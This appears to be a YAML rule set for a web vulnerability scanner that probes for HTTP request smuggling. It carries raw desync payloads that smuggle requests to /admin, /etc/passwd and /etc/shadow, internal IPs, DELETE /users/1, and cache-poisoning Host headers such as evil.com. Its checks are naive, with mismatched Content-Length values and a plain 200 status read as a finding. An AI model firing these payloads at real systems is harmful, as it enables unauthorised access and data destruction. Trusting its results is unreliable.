# Request Smuggling Security Bambda
# Detects HTTP request smuggling vulnerabilities

metadata:
  name: "Request Smuggling Security Bambda"
  description: "Detects HTTP request smuggling vulnerabilities including CL.TE, TE.CL, and other smuggling techniques"
  author: "Burp Automation Tool"
  version: "1.0.0"
  tags: ["request-smuggling", "http-smuggling", "cl-te", "te-cl", "http-parsing"]

rules:
  - name: "CL.TE Request Smuggling"
    description: "Detects CL.TE request smuggling vulnerabilities"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
          - payload: "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nXX"
          - payload: "Content-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nXXXX"
        then:
          - if: "response.status == 200"
            issue: "CL.TE Request Smuggling"
            detail: "CL.TE request smuggling vulnerability detected"
            severity: "High"
            confidence: "Medium"

  - name: "TE.CL Request Smuggling"
    description: "Detects TE.CL request smuggling vulnerabilities"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX"
          - payload: "Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nXX"
          - payload: "Transfer-Encoding: chunked\r\nContent-Length: 8\r\n\r\n0\r\n\r\nXXXX"
        then:
          - if: "response.status == 200"
            issue: "TE.CL Request Smuggling"
            detail: "TE.CL request smuggling vulnerability detected"
            severity: "High"
            confidence: "Medium"

  - name: "TE.TE Request Smuggling"
    description: "Detects TE.TE request smuggling vulnerabilities"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nX"
          - payload: "Transfer-Encoding: chunked\r\nTransfer-Encoding: gzip\r\n\r\n0\r\n\r\nX"
          - payload: "Transfer-Encoding: chunked\r\nTransfer-Encoding: deflate\r\n\r\n0\r\n\r\nX"
        then:
          - if: "response.status == 200"
            issue: "TE.TE Request Smuggling"
            detail: "TE.TE request smuggling vulnerability detected"
            severity: "High"
            confidence: "Medium"

  - name: "Header Injection via Smuggling"
    description: "Detects header injection via request smuggling"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 35\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com"
          - payload: "Content-Length: 40\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: evil.com"
          - payload: "Content-Length: 45\r\n\r\n0\r\n\r\nPUT /admin HTTP/1.1\r\nHost: evil.com"
        then:
          - if: "response.status == 200"
            issue: "Header Injection via Smuggling"
            detail: "Header injection via request smuggling detected"
            severity: "High"
            confidence: "Medium"

  - name: "Authentication Bypass via Smuggling"
    description: "Detects authentication bypass via request smuggling"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 50\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nAuthorization: admin"
          - payload: "Content-Length: 55\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nAuthorization: admin"
          - payload: "Content-Length: 60\r\n\r\n0\r\n\r\nPUT /admin HTTP/1.1\r\nAuthorization: admin"
        then:
          - if: "response.status == 200"
            issue: "Authentication Bypass via Smuggling"
            detail: "Authentication bypass via request smuggling detected"
            severity: "High"
            confidence: "Medium"

  - name: "Path Traversal via Smuggling"
    description: "Detects path traversal via request smuggling"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 45\r\n\r\n0\r\n\r\nGET /../../../etc/passwd HTTP/1.1"
          - payload: "Content-Length: 50\r\n\r\n0\r\n\r\nGET /../../../../etc/hosts HTTP/1.1"
          - payload: "Content-Length: 55\r\n\r\n0\r\n\r\nGET /../../../../../etc/shadow HTTP/1.1"
        then:
          - if: "response.status == 200"
            issue: "Path Traversal via Smuggling"
            detail: "Path traversal via request smuggling detected"
            severity: "High"
            confidence: "Medium"

  - name: "SSRF via Smuggling"
    description: "Detects SSRF via request smuggling"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 50\r\n\r\n0\r\n\r\nGET http://127.0.0.1 HTTP/1.1"
          - payload: "Content-Length: 55\r\n\r\n0\r\n\r\nGET http://localhost HTTP/1.1"
          - payload: "Content-Length: 60\r\n\r\n0\r\n\r\nGET http://192.168.1.1 HTTP/1.1"
        then:
          - if: "response.status == 200"
            issue: "SSRF via Smuggling"
            detail: "SSRF via request smuggling detected"
            severity: "High"
            confidence: "Medium"

  - name: "Cache Poisoning via Smuggling"
    description: "Detects cache poisoning via request smuggling"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 60\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: evil.com"
          - payload: "Content-Length: 65\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: attacker.com"
          - payload: "Content-Length: 70\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: malicious.com"
        then:
          - if: "response.headers contains 'X-Cache'"
            issue: "Cache Poisoning via Smuggling"
            detail: "Cache poisoning via request smuggling detected"
            severity: "High"
            confidence: "Medium"

  - name: "Method Confusion via Smuggling"
    description: "Detects method confusion via request smuggling"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 45\r\n\r\n0\r\n\r\nDELETE /users/1 HTTP/1.1"
          - payload: "Content-Length: 50\r\n\r\n0\r\n\r\nPUT /users/1 HTTP/1.1"
          - payload: "Content-Length: 55\r\n\r\n0\r\n\r\nPATCH /users/1 HTTP/1.1"
        then:
          - if: "response.status == 200"
            issue: "Method Confusion via Smuggling"
            detail: "Method confusion via request smuggling detected"
            severity: "High"
            confidence: "Medium"

  - name: "Parameter Pollution via Smuggling"
    description: "Detects parameter pollution via request smuggling"
    severity: "Medium"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.headers"
        inject:
          - payload: "Content-Length: 55\r\n\r\n0\r\n\r\nGET /api/users?id=1&id=2 HTTP/1.1"
          - payload: "Content-Length: 60\r\n\r\n0\r\n\r\nGET /api/users?user=admin&user=test HTTP/1.1"
          - payload: "Content-Length: 65\r\n\r\n0\r\n\r\nGET /api/users?role=user&role=admin HTTP/1.1"
        then:
          - if: "response.status == 200"
            issue: "Parameter Pollution via Smuggling"
            detail: "Parameter pollution via request smuggling detected"
            severity: "Medium"
            confidence: "Medium"

filters:
  - name: "API Endpoints"
    when: "request"
    where: "request.url"
    include:
      - pattern: "/api/"
        flags: "i"
      - pattern: "/rest/"
        flags: "i"
      - pattern: "/v[0-9]+/"
        flags: "i"
      - pattern: "/admin/"
        flags: "i"
      - pattern: "/proxy/"
        flags: "i"

settings:
  max_payloads_per_parameter: 10
  timeout: 15000
  follow_redirects: false
  respect_robots_txt: false
